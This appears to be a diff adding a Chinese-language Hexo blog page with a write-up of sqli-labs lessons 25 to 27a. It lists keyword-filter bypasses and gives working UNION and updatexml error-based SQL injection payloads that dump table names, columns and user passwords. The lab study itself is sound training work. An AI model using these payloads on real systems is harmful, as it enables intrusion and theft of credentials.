@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>lesson25-28a | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="lesson25：这一关它告诉我们and和or都被过滤了。 一般，绕开过滤的方法有以下几种： （1）大小写变形 Or,OR,oR  （2）编码，hex，urlencode  （3）添加注释&#x2F;or&#x2F;  （4）利用符号 and&#x3D;&amp;&amp;，or&#x3D;|| （5）构造字符串——oorr，anandd 我们查看源码：  这里的or和and采用了i正则匹配，大小写都无法绕过。 {">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lesson25-28a">
+<meta property="og:url" content="http://example.com/2021/02/04/lesson25-28a/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="lesson25：这一关它告诉我们and和or都被过滤了。 一般，绕开过滤的方法有以下几种： （1）大小写变形 Or,OR,oR  （2）编码，hex，urlencode  （3）添加注释&#x2F;or&#x2F;  （4）利用符号 and&#x3D;&amp;&amp;，or&#x3D;|| （5）构造字符串——oorr，anandd 我们查看源码：  这里的or和and采用了i正则匹配，大小写都无法绕过。 {">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/.com//6.png">
+<meta property="og:image" content="http://example.com/.com//7.png">
+<meta property="og:image" content="http://example.com/.com//8.png">
+<meta property="og:image" content="http://example.com/.com//9.png">
+<meta property="og:image" content="http://example.com/.com//10.png">
+<meta property="og:image" content="http://example.com/.com//11.png">
+<meta property="article:published_time" content="2021-02-04T08:26:27.000Z">
+<meta property="article:modified_time" content="2021-02-06T05:25:27.537Z">
+<meta property="article:author" content="linbei">
+<meta property="article:tag" content="sqlilabs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-lesson25-28a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/04/lesson25-28a/" class="article-date">
+  <time datetime="2021-02-04T08:26:27.000Z" itemprop="datePublished">2021-02-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      lesson25-28a
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="lesson25："><a href="#lesson25：" class="headerlink" title="lesson25："></a>lesson25：</h2><p>这一关它告诉我们and和or都被过滤了。</p>
+<p>一般，绕开过滤的方法有以下几种：</p>
+<p>（1）大小写变形 Or,OR,oR </p>
+<p>（2）编码，hex，urlencode </p>
+<p>（3）添加注释/<em>or</em>/ </p>
+<p>（4）利用符号 and=&amp;&amp;，or=||</p>
+<p>（5）构造字符串——oorr，anandd</p>
+<p>我们查看源码：</p>
+<p><img src="/.com//1.png" alt="1"></p>
+<p>这里的or和and采用了i正则匹配，大小写都无法绕过。</p>
+<p>{               <strong>拓展一下PHP正则表达式的模式修饰符</strong></p>
+<ul>
+<li>i</li>
+</ul>
+<p>​       如果设定此修正符，模式中的字符将同时匹配大小写字母。</p>
+<ul>
+<li><p>m<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p>
+</li>
+<li><p>s<br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p>
+</li>
+<li><p>x<br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</p>
+</li>
+</ul>
+<p>}</p>
+<p><strong>那么这关我们就以双写绕过的方式为例。</strong></p>
+<p>查看源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>从中得知这关为单引号类型注入。</p>
+<p>当输入?id=1时，页面有回显。那么我们可以采用union联合注入。</p>
+<h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库:"></a>爆库:</h3><p>输入：?id=0’  union select 1,2,database()–+</p>
+<p>得，<img src="/.com//2.png" alt="2"></p>
+<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p>
+<p>table_schema=’security’–+</p>
+<p>得，<img src="/.com//3.png" alt="3"></p>
+<p>注：information中也含有or，因此也需要做绕过处理。</p>
+<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p>
+<p>table_schema=’security’–+</p>
+<p>得，<img src="/.com//4.png" alt="4"></p>
+<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+</p>
+<p>得，<img src="/.com//5.png" alt="5"></p>
+<p>注：password中也含有or，因此也需要做绕过处理。</p>
+<h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>和lesson25没什么区别，注意注入类型就好了。</p>
+<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/.com//6.png" alt="6"></p>
+<p>我们可以看到它就过滤了一堆字符。此时，我们可以采用<strong>URL编码</strong>绕过这些过滤：</p>
+<p>+       URL 中+号表示空格                 %2B<br>空格  URL中的空格可以用+号或者编码      %20<br>/        分隔目录和子目录                   %2F<br>?        分隔实际的URL和参数               %3F<br>%       指定特殊字符                     %25<br>#       表示书签                         %23<br>&amp;       URL 中指定的参数间的分隔符         %26<br>=        URL 中指定参数的值                %3D</p>
+<p>我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入——</p>
+<h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1</p>
+<p>得，<img src="/.com//7.png" alt="7"></p>
+<h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
+<p>得，<img src="/.com//8.png" alt="8"></p>
+<h3 id="爆列：-1"><a href="#爆列：-1" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1</p>
+<p>得，<img src="/.com//9.png" alt="9"></p>
+<h3 id="爆值：-1"><a href="#爆值：-1" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1</p>
+<p>得，<img src="/.com//10.png" alt="10"></p>
+<p>这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || ‘1’=’1</p>
+<h2 id="lesson26a："><a href="#lesson26a：" class="headerlink" title="lesson26a："></a>lesson26a：</h2><p>当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。</p>
+<h2 id="lesson27："><a href="#lesson27：" class="headerlink" title="lesson27："></a>lesson27：</h2><p>同lesson26，报错注入。</p>
+<p>源码：</p>
+<p><img src="/.com//11.png" alt="11"></p>
+<ul>
+<li><p>若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。</p>
+</li>
+<li><p>这关取消了对and和or的过滤。</p>
+</li>
+</ul>
+<h2 id="lesson27a："><a href="#lesson27a：" class="headerlink" title="lesson27a："></a>lesson27a：</h2><p>不能使用报错注入。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/04/lesson25-28a/" data-id="ckkrqc5cs0021n4vu0fss9kcf" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/02/05/lesson29-31/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          lesson29-31
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/03/lesson24/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">lesson24</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 17.5px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 15px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/13/blog/">blog</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/29/i%E6%98%A5%E7%A7%8B2/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/19/i%E6%98%A5%E7%A7%8B1/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/13/buuctf2/">buuctf2</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 linbei<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
